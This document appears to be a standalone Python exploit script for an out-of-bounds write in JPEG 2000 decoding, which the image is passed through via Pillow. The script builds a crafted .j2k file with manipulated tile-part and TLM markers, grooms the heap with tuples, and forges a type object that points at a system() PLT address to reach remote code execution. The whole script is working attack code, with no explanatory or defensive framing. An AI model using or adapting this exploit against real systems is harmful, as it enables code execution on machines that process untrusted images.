#!/usr/bin/env python3
# J2K OOB write -> RCE. raw output only.
import base64, ctypes, gc, hashlib, io, os, struct, sys
from PIL import Image

BASE_B64 = "/0//UQApAAAAAAAQAAAAEAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAABBwEB/1IADAAAAAEAAAQEAAH/XAAEQED/ZAAlAAFDcmVhdGVkIGJ5IE9wZW5KUEVHIHZlcnNpb24gMi41LjT/kAAKAAAAAABOAAH/k9+B6BIsQqGcePfaH6J2a52C7HAOOEJLO9DkkxnmuojgjgHEo0UCaRbE/XwDXlp0l9bS5htYaivl83zfN83zfN//kAAKAAEAAABKAAH/k8+05BKM5hYoeYN0iCViDY8CH/GnJJ6NrJGh+kHECP8bm1mOpdp0l3ycM7dKtso0M+8h0V3PE5vm+b5vnf+QAAoAAgAAAEcAAf+Tz7TYCDVtlNoiepB4nOXRzR66jLfwSPsPE2sijSGtsefuWLd35C8fN0K0scgkHU5MTdVfZeXl5e9P/5AACgADAAAASgAB/5PPtOQOXu97sgYhlCUNE/jGwoj54OtGEwCcNoPdvu7enp/Goi0LxLCJKTaOxn6fzAyNh7pOrll5eXl5eXn/2Q=="
OUT = '/tmp/J2K_RCE.j2k'
SYSTEM_PLT = 0x420580
W = sys.stdout.write


def build(base, out, tile, N, A, B, C, e1=0, e2=0, e3=0):
    d = bytearray(base)
    eoc = d.rfind(b'\xff\xd9')
    soc = d.find(b'\xff\x4f')
    si = d.find(b'\xff\x51', soc)
    siz_end = si + 2 + struct.unpack('>H', d[si + 2:si + 4])[0]
    nt = 4
    head = siz_end + (4 + 3 * (N + (nt - 1)))
    S_N = A - 4
    p1 = S_N - head - (N - 2) * 14 - 12 + e1
    pB = B - A - 14 + e2
    pC = C - B - 14 + e3
    if p1 < 0 or pB < 0 or pC < 0:
        W('BUILD_NEG %d %d %d\n' % (p1, pB, pC))
        sys.exit(1)
    pl = [0] * (N + 2)
    pl[0] = p1
    pl[N] = pB
    pl[N + 1] = pC
    extra = b''
    for k in range(N + 2):
        L = pl[k]
        extra += (b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>H', tile) +
                  struct.pack('>I', 14 + L) + bytes([1 + k, 0]) + b'\xff\x93' + b'A' * L)
    buf = bytearray(bytes(d[:eoc]) + extra + bytes(d[eoc:]))
    ents = b''
    for t in range(nt):
        for _ in range(N if t == tile else 1):
            ents += bytes([t]) + struct.pack('>H', 1)
    TLM = b'\xff\x55' + struct.pack('>H', 4 + len(ents)) + bytes([0, 0x10]) + ents
    buf = bytearray(bytes(buf[:siz_end]) + TLM + bytes(buf[siz_end:]))
    i = siz_end + len(TLM)
    while i < len(buf) - 12:
        if buf[i] == 0xFF and buf[i + 1] == 0x90:
            L = struct.unpack('>H', buf[i + 2:i + 4])[0]
            buf[i + 11] = 0
            i += 2 + L
        else:
            i += 1
    open(out, 'wb').write(bytes(buf))
    return bytes(buf)


OFFS = [-0x10, -0x08, 0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38]


def dump(a):
    return ' '.join('%016x' % ctypes.c_uint64.from_address(a + o).value for o in OFFS)


gc.disable()
W('SELF_SHA256 %s\n' % hashlib.sha256(open(os.path.abspath(__file__), 'rb').read()).hexdigest())
W('PYTHON %s\n' % sys.version.split()[0])
W('PILLOW %s\n' % Image.__version__)
W('EXECUTABLE %s\n' % sys.executable)

blob = bytearray(519)
_k = ctypes.c_char.from_buffer(blob)
bd = ctypes.addressof(_k)
OFF_TYPE = 0x40
PT = id(tuple)


def fill(v):
    struct.pack_into('<Q', blob, 0x00, v)
    struct.pack_into('<Q', blob, 0x08, bd + OFF_TYPE)
    struct.pack_into('<Q', blob, OFF_TYPE + 0x58, SYSTEM_PLT)


fill(0x6469)
W('BLOB_ADDR %#x\n' % bd)
W('FAKE_TYPE %#x\n' % (bd + OFF_TYPE))
W('PY_TUPLE_TYPE %#x\n' % PT)
W('SYSTEM_PLT %#x\n' % SYSTEM_PLT)
A_VAL = PT - 0x0c
B_VAL = PT
C_VAL = bd - 4
W('WRITE_A %#x\nWRITE_B %#x\nWRITE_C %#x\n' % (A_VAL, B_VAL, C_VAL))

img = build(base64.b64decode(BASE_B64), OUT, 0, 23, A_VAL, B_VAL, C_VAL, -370, 4, 0)
W('J2K_PATH %s\n' % OUT)
W('J2K_SIZE %d\n' % len(img))
W('J2K_SHA256 %s\n' % hashlib.sha256(img).hexdigest())

NPAIR, NDRAIN = 128, 1024
drain = [bytes(bytearray(b'D' * 519)) for _ in range(NDRAIN)]
a, b, c, d, e = object(), object(), object(), object(), object()
pairs = []
for _ in range(NPAIR):
    gap = bytes(bytearray(b'G' * 519))
    t = (a, b, c, d, e) * 22
    pairs.append((gap, t))
gold = [(g, t) for (g, t) in pairs if id(t) - id(g) == 0x240]
tinies = [t for (g, t) in pairs]
holes = [g for (g, t) in gold[:16]]
W('TUPLES %d\n' % len(tinies))
W('ADJACENT %d\n' % len(gold))
before = dict((id(t), dump(id(t))) for t in tinies)
del pairs, gold
gc.collect()
del holes
gc.collect()

im = Image.open(io.BytesIO(img))
im.load()
W('DECODE rc=0\n')

for t in tinies:
    a0 = id(t)
    if ctypes.c_uint64.from_address(a0 + 0x08).value != PT:
        continue
    if ctypes.c_uint64.from_address(a0 + 0x28).value != bd:
        continue
    W('VICTIM %#x\n' % a0)
    W('BEFORE %s\n' % before[a0])
    W('AFTER  %s\n' % dump(a0))
    W('BLOB_DUMP %s\n' % ' '.join('%016x' % ctypes.c_uint64.from_address(bd + i * 8).value for i in range(4)))
    val = t[2]
    for k in range(1, 5):
        fill(0x6469 - k)
        try:
            repr(val)
        except BaseException:
            pass
        try:
            W('%s\n' % (val,))
        except BaseException:
            pass
    break
sys.stdout.flush()
os._exit(0)
